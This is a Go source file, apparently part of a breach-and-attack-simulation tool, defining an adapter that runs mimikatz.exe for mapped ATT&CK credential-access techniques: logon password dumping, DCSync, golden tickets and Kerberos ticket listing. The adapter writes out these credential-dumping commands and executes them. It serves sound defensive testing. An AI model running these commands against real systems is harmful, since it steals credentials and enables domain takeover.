package adapters

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"runtime"
	"time"

	"github.com/craftedsignal/cli/internal/simulate"
)

// mimikatzAdapter integrates with mimikatz.exe for credential access techniques.
type mimikatzAdapter struct{}

var mimikatzTechniques = []simulate.Technique{
	{ID: "T1003.001", Name: "Logon Password Dump (sekurlsa::logonpasswords)", Platforms: []simulate.Platform{simulate.Windows}, ExecModes: []simulate.ExecMode{simulate.Local, simulate.RemoteWinRM}},
	{ID: "T1003.006", Name: "DCSync (lsadump::dcsync)", Platforms: []simulate.Platform{simulate.Windows}, ExecModes: []simulate.ExecMode{simulate.Local, simulate.RemoteWinRM}},
	{ID: "T1558.001", Name: "Golden Ticket (kerberos::golden)", Platforms: []simulate.Platform{simulate.Windows}, ExecModes: []simulate.ExecMode{simulate.Local}},
	{ID: "T1558.003", Name: "Kerberoasting (kerberos::list)", Platforms: []simulate.Platform{simulate.Windows}, ExecModes: []simulate.ExecMode{simulate.Local}},
}

// mimikatzCommands maps technique IDs to the mimikatz command arguments.
var mimikatzCommands = map[string]string{
	"T1003.001": "sekurlsa::logonpasswords",
	"T1003.006": "lsadump::dcsync",
	"T1558.001": "kerberos::golden",
	"T1558.003": "kerberos::list",
}

func NewMimikatz() simulate.BASAdapter {
	return &mimikatzAdapter{}
}

func (m *mimikatzAdapter) Name() string               { return "mimikatz" }
func (m *mimikatzAdapter) Kind() simulate.AdapterKind  { return simulate.Tool }

func (m *mimikatzAdapter) Available() bool {
	// mimikatz.exe is only natively available on Windows.
	// For remote execution via WinRM, availability depends on the target.
	if runtime.GOOS == "windows" {
		_, err := exec.LookPath("mimikatz.exe")
		return err == nil
	}
	return false
}

func (m *mimikatzAdapter) List(filter simulate.Filter) ([]simulate.Technique, error) {
	var out []simulate.Technique
	for _, t := range mimikatzTechniques {
		if filter.TechniqueID != "" && t.ID != filter.TechniqueID {
			continue
		}
		if filter.Platform != "" && !containsPlatform(t.Platforms, filter.Platform) {
			continue
		}
		out = append(out, t)
	}
	return out, nil
}

func (m *mimikatzAdapter) Plan(techniqueID string) (*simulate.ExecutionPlan, error) {
	mimiCmd, ok := mimikatzCommands[techniqueID]
	if !ok {
		return nil, fmt.Errorf("technique %s not supported by mimikatz adapter", techniqueID)
	}

	// Find the technique to get its default exec mode.
	var mode simulate.ExecMode
	for _, t := range mimikatzTechniques {
		if t.ID == techniqueID {
			mode = t.ExecModes[0]
			break
		}
	}

	return &simulate.ExecutionPlan{
		TechniqueID:    techniqueID,
		AdapterName:    m.Name(),
		ExecMode:       mode,
		CommandPreview: fmt.Sprintf("mimikatz.exe \"%s\"", mimiCmd),
	}, nil
}

func (m *mimikatzAdapter) Execute(ctx context.Context, plan *simulate.ExecutionPlan) (*simulate.ExecutionResult, error) {
	mimiCmd, ok := mimikatzCommands[plan.TechniqueID]
	if !ok {
		return nil, fmt.Errorf("technique %s not supported by mimikatz adapter", plan.TechniqueID)
	}

	start := time.Now()

	var stdout, stderr bytes.Buffer
	cmd := exec.CommandContext(ctx, "mimikatz.exe", mimiCmd)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	result := &simulate.ExecutionResult{
		Success:   err == nil,
		StartTime: start,
		EndTime:   time.Now(),
		Stdout:    stdout.String(),
		Stderr:    stderr.String(),
	}
	if exitErr, ok := err.(*exec.ExitError); ok {
		result.ExitCode = exitErr.ExitCode()
	} else if err != nil {
		result.ExitCode = -1
	}
	return result, nil
}

func (m *mimikatzAdapter) Cleanup(_ context.Context, _ *simulate.ExecutionPlan) error {
	// mimikatz does not have a built-in cleanup mechanism.
	return nil
}
